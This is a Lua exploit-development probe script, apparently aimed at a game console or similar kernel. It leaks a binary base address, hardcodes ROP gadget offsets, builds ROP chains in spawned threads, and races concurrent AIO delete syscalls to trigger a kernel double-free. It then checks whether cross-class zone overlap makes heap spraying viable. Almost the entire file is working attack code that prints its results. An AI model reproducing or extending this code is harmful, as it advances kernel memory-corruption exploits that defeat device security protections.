-- CRASH_CLASS: HIGH
-- PROBE 69i: AIO cmd=2 (write) and class=2/3 lifecycle + double-free
--
-- GAP A: All 30+ AIO probes use class=1. Classes 2 and 3 are accepted
--        by 669 but never tested for double-free. Different classes may
--        use different zones or shared zones — unlocking cross-spray.
-- GAP B: All probes use cmd=1 (read). cmd=2 (write) was never tested.
--        The write path may have a wider TOCTOU window or different
--        sub-object types.
--
-- 669(cmd, reqs, count, class, ids)
-- reqs stride 0x28: +0x00=offset, +0x08=nbytes, +0x10=buf, +0x18=result, +0x20=fd

print("=== PROBE 69i: AIO cmd=2 + class=2/3 ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

-- Ignore SIGSYS, SIGSEGV, SIGBUS
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

-- Open /dev/zero for reads
local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("/dev/zero fd=" .. fd_zero)

-- Create socketpair for write target (writable fd)
local sp_buf = memory.alloc(16)
wd(N(sp_buf), 0xFFFFFFFF); wd(N(sp_buf) + 4, 0xFFFFFFFF)
pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp_buf))) end)
local fd_wr = rd(N(sp_buf) + 4) or -1
local fd_rd_pair = rd(N(sp_buf)) or -1
print("socketpair: write_fd=" .. fd_wr .. " read_fd=" .. fd_rd_pair)

local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)
local reqs = memory.alloc(0x30)

-- Fill data_buf with pattern for writes
for i = 0, 0xFC, 4 do wd(N(data_buf) + i, 0x41424344) end

-- Generic submit: cmd (1=read, 2=write), class, fd
local function submit(cmd, cls, fd)
    wq(N(reqs), uint64(0))           -- offset
    wq(N(reqs) + 8, uint64(16))      -- nbytes
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    local ret = -1
    pcall(function()
        ret = sgn(mk(669)(uint64(cmd), uint64(N(reqs)), uint64(1), uint64(cls), uint64(N(one_id))))
    end)
    local id = rd(N(one_id)) or 0
    return id, ret
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0xDEAD
end

local function wait_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function()
        mk(663)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0xDEAD
end

local function delete_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function()
        mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0xDEAD
end

-- Child builder for concurrent 662
local function build_delete_child(del_ids_addr, count, states_addr)
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    emit(g_pop_rdi); emit(uint64(del_ids_addr))
    emit(g_pop_rsi); emit(uint64(count))
    emit(g_pop_rdx); emit(uint64(states_addr))
    emit(g_pop_rax); emit(uint64(662))
    emit(stub)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431))
    emit(stub)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    local tid = memory.alloc(8); wq(N(tid), uint64(0))
    wq(N(par) + 0x30, tid)
    return par
end

-- ============================================================
-- [A] CLASS LIFECYCLE: class=1/2/3 with cmd=1 (read)
-- ============================================================
print("[A] Class lifecycle (cmd=1 read, class=1/2/3)")

for cls = 1, 3 do
    if not alive() then print("  DEAD before class=" .. cls); break end
    local id, ret = submit(1, cls, fd_zero)
    print(string.format("  class=%d: submit ret=%d id=0x%X", cls, ret, id))
    if id ~= 0 then
        local pst = poll_one(id)
        local wst = wait_one(id)
        local dst = delete_one(id)
        print(string.format("    poll=0x%X wait=0x%X delete=0x%X", pst, wst, dst))
    end
end

if not alive() then print("DEAD after [A]"); return end

-- ============================================================
-- [B] CMD=2 WRITE LIFECYCLE: class=1/2/3
-- ============================================================
print("")
print("[B] Write lifecycle (cmd=2, class=1/2/3)")

-- Need a writable fd. Try socketpair write end.
local write_fd = fd_wr
if write_fd < 0 then
    print("  No writable fd, skipping cmd=2 tests")
else
    for cls = 1, 3 do
        if not alive() then break end
        local id, ret = submit(2, cls, write_fd)
        print(string.format("  cmd=2 class=%d: submit ret=%d id=0x%X", cls, ret, id))
        if id ~= 0 then
            local pst = poll_one(id)
            local wst = wait_one(id)

            -- Read result_buf to see if write happened
            local res_lo = rd(N(result_buf)) or 0
            local res_hi = rd(N(result_buf) + 4) or 0
            print(string.format("    poll=0x%X wait=0x%X result=0x%08X%08X",
                pst, wst, res_hi, res_lo))

            local dst = delete_one(id)
            print(string.format("    delete=0x%X", dst))
        end
    end
end

-- Drain the socketpair read end so writes don't block
if fd_rd_pair >= 0 then
    local drain = memory.alloc(0x1000)
    for rep = 1, 10 do
        pcall(function() mk(3)(uint64(fd_rd_pair), uint64(N(drain)), uint64(0x1000)) end)
    end
end

if not alive() then print("DEAD after [B]"); return end

-- ============================================================
-- [C] DOUBLE-FREE RACE: class=2 IDs (if class=2 submit works)
-- ============================================================
print("")
print("[C] Double-free race on class=2 IDs (cmd=1)")

local BATCH = 16
local del_ids = memory.alloc(4 * BATCH + 0x10)
local states_A = memory.alloc(4 * BATCH + 0x10)
local states_B = memory.alloc(4 * BATCH + 0x10)

local c2_works = false
do
    local test_id, test_ret = submit(1, 2, fd_zero)
    if test_id ~= 0 then
        poll_one(test_id)
        delete_one(test_id)
        c2_works = true
        print("  class=2 submit OK — proceeding with race")
    else
        print("  class=2 submit FAILED (id=0) — skipping race")
    end
end

if c2_works and alive() then
    local ITERS = 15
    local total_doubles_c2 = 0

    for iter = 1, ITERS do
        if not alive() then print("  DEAD at iter " .. iter); break end

        local ids = {}
        for i = 1, BATCH do
            local id, _ = submit(1, 2, fd_zero)
            if id ~= 0 then poll_one(id); table.insert(ids, id) end
        end
        if #ids < 8 then
            print(string.format("  iter %d: only %d IDs, skip", iter, #ids))
            break
        end

        for i = 0, #ids - 1 do
            wd(N(del_ids) + i * 4, ids[i + 1])
            wd(N(states_A) + i * 4, 0xAAAAAAAA)
            wd(N(states_B) + i * 4, 0xBBBBBBBB)
        end

        local par_A = build_delete_child(N(del_ids), #ids, N(states_A))
        local par_B = build_delete_child(N(del_ids), #ids, N(states_B))
        pcall(function() mk(455)(par_A, uint64(0x38)) end)
        pcall(function() mk(455)(par_B, uint64(0x38)) end)
        for w = 1, 50000 do local _ = rd(N(del_ids)) end

        local doubles = 0
        for i = 0, #ids - 1 do
            local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
            local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
            if sA == 0 and sB == 0 then doubles = doubles + 1 end
        end
        total_doubles_c2 = total_doubles_c2 + doubles

        if not alive() then
            print(string.format("  iter %d: CRASHED (doubles=%d)", iter, doubles))
            break
        end

        if doubles > 0 or iter <= 3 then
            print(string.format("  iter %d: doubles=%d/%d", iter, doubles, #ids))
        end
    end

    print(string.format("  CLASS=2 TOTAL DOUBLES: %d", total_doubles_c2))
    if total_doubles_c2 > 0 then
        print("  *** CLASS=2 DOUBLE-FREE WORKS ***")
    end
end

if not alive() then print("DEAD after [C]"); return end

-- ============================================================
-- [D] DOUBLE-FREE RACE: cmd=2 (write) IDs
-- ============================================================
print("")
print("[D] Double-free race on cmd=2 (write) IDs, class=1")

local cmd2_works = false
if write_fd >= 0 then
    local test_id, test_ret = submit(2, 1, write_fd)
    if test_id ~= 0 then
        poll_one(test_id)
        delete_one(test_id)
        cmd2_works = true
        print("  cmd=2 class=1 submit OK — proceeding with race")
    else
        print("  cmd=2 class=1 submit FAILED — skipping race")
    end
end

-- Drain again
if fd_rd_pair >= 0 then
    local drain = memory.alloc(0x1000)
    for rep = 1, 10 do
        pcall(function() mk(3)(uint64(fd_rd_pair), uint64(N(drain)), uint64(0x1000)) end)
    end
end

if cmd2_works and alive() then
    local ITERS = 10
    local total_doubles_w = 0

    for iter = 1, ITERS do
        if not alive() then print("  DEAD at iter " .. iter); break end

        local ids = {}
        for i = 1, BATCH do
            local id, _ = submit(2, 1, write_fd)
            if id ~= 0 then poll_one(id); table.insert(ids, id) end
        end

        -- Drain so socketpair doesn't fill up
        if fd_rd_pair >= 0 then
            local drain = memory.alloc(0x1000)
            for rep = 1, 20 do
                pcall(function() mk(3)(uint64(fd_rd_pair), uint64(N(drain)), uint64(0x1000)) end)
            end
        end

        if #ids < 8 then
            print(string.format("  iter %d: only %d IDs", iter, #ids))
            break
        end

        for i = 0, #ids - 1 do
            wd(N(del_ids) + i * 4, ids[i + 1])
            wd(N(states_A) + i * 4, 0xAAAAAAAA)
            wd(N(states_B) + i * 4, 0xBBBBBBBB)
        end

        local par_A = build_delete_child(N(del_ids), #ids, N(states_A))
        local par_B = build_delete_child(N(del_ids), #ids, N(states_B))
        pcall(function() mk(455)(par_A, uint64(0x38)) end)
        pcall(function() mk(455)(par_B, uint64(0x38)) end)
        for w = 1, 50000 do local _ = rd(N(del_ids)) end

        local doubles = 0
        for i = 0, #ids - 1 do
            local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
            local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
            if sA == 0 and sB == 0 then doubles = doubles + 1 end
        end
        total_doubles_w = total_doubles_w + doubles

        if not alive() then
            print(string.format("  iter %d: CRASHED (doubles=%d)", iter, doubles))
            break
        end

        if doubles > 0 or iter <= 3 then
            print(string.format("  iter %d: doubles=%d/%d", iter, doubles, #ids))
        end
    end

    print(string.format("  CMD=2 TOTAL DOUBLES: %d", total_doubles_w))
    if total_doubles_w > 0 then
        print("  *** CMD=2 WRITE DOUBLE-FREE WORKS ***")
    end
end

if not alive() then print("DEAD after [D]"); return end

-- ============================================================
-- [E] CROSS-CLASS: class=1 double-free, then check class=2 IDs
-- ============================================================
print("")
print("[E] Cross-class zone overlap test")

local c2_alive = false
do
    local test_id, _ = submit(1, 2, fd_zero)
    if test_id ~= 0 then
        poll_one(test_id); delete_one(test_id); c2_alive = true
    end
end

if not c2_alive then
    print("  class=2 dead, skipping")
else
    local ITERS = 10
    local cross_anomalies = 0

    for iter = 1, ITERS do
        if not alive() then break end

        -- Submit class=2 IDs first (these are the "victim" objects)
        local c2_ids = {}
        for i = 1, 8 do
            local id, _ = submit(1, 2, fd_zero)
            if id ~= 0 then poll_one(id); table.insert(c2_ids, id) end
        end

        -- Submit class=1 IDs (these will be double-freed)
        local c1_ids = {}
        for i = 1, BATCH do
            local id, _ = submit(1, 1, fd_zero)
            if id ~= 0 then poll_one(id); table.insert(c1_ids, id) end
        end

        if #c1_ids < 8 or #c2_ids < 4 then
            print(string.format("  iter %d: c1=%d c2=%d, skip", iter, #c1_ids, #c2_ids))
            break
        end

        -- Double-free the class=1 IDs
        for i = 0, #c1_ids - 1 do
            wd(N(del_ids) + i * 4, c1_ids[i + 1])
            wd(N(states_A) + i * 4, 0xAAAAAAAA)
            wd(N(states_B) + i * 4, 0xBBBBBBBB)
        end

        local par_A = build_delete_child(N(del_ids), #c1_ids, N(states_A))
        local par_B = build_delete_child(N(del_ids), #c1_ids, N(states_B))
        pcall(function() mk(455)(par_A, uint64(0x38)) end)
        pcall(function() mk(455)(par_B, uint64(0x38)) end)
        for w = 1, 50000 do local _ = rd(N(del_ids)) end

        local doubles = 0
        for i = 0, #c1_ids - 1 do
            local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
            local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
            if sA == 0 and sB == 0 then doubles = doubles + 1 end
        end

        if not alive() then
            print(string.format("  iter %d: CRASHED (doubles=%d)", iter, doubles))
            break
        end

        -- NOW check class=2 IDs — are they corrupted by class=1 double-free?
        local c2_killed = 0
        local c2_anomaly = 0
        for _, c2id in ipairs(c2_ids) do
            -- Try to wait on the class=2 ID
            local wst = wait_one(c2id)
            -- Normal values: 0, standard status codes
            -- Anomalous: 0x80020003 (unknown ID = slot was freed/corrupted)
            if wst == 0x80020003 then
                c2_killed = c2_killed + 1
            end

            -- Try to delete the class=2 ID
            local dst = delete_one(c2id)
            if dst ~= 0 then
                c2_anomaly = c2_anomaly + 1
            end
        end

        if c2_killed > 0 or c2_anomaly > 0 then
            cross_anomalies = cross_anomalies + 1
            print(string.format("  iter %d: c1_doubles=%d c2_killed=%d c2_del_fail=%d *** CROSS-CLASS OVERLAP ***",
                iter, doubles, c2_killed, c2_anomaly))
        else
            -- Delete remaining class=2 IDs (they should still be valid)
            if iter <= 3 or doubles > 0 then
                print(string.format("  iter %d: c1_doubles=%d c2_killed=%d c2_del_fail=%d",
                    iter, doubles, c2_killed, c2_anomaly))
            end
        end
    end

    print(string.format("  CROSS-CLASS ANOMALIES: %d/%d iters", cross_anomalies, ITERS))
    if cross_anomalies > 0 then
        print("  *** CLASSES SHARE ZONES — CROSS-CLASS SPRAY IS VIABLE ***")
    else
        print("  No cross-class effect detected (classes may use separate zones)")
    end
end

-- ============================================================
-- [F] sys 624 delta per class (VM op counter)
-- ============================================================
print("")
print("[F] sys 624 VM-op delta per class")

if alive() then
    for cls = 1, 3 do
        if not alive() then break end
        local pre = nil
        pcall(function() pre = mk(624)(uint64(0)) end)
        local test_ids = {}
        for i = 1, 8 do
            local id, _ = submit(1, cls, fd_zero)
            if id ~= 0 then table.insert(test_ids, id) end
        end
        local post = nil
        pcall(function() post = mk(624)(uint64(0)) end)
        local delta = 0
        if pre and post then delta = N(post) - N(pre) end
        print(string.format("  class=%d: %d submits, 624 delta=%d (per-submit=%.1f)",
            cls, #test_ids, delta, #test_ids > 0 and delta / #test_ids or 0))
        for _, tid in ipairs(test_ids) do
            poll_one(tid); delete_one(tid)
        end
    end
end

print("")
print("=== PROBE 69i COMPLETE ===")
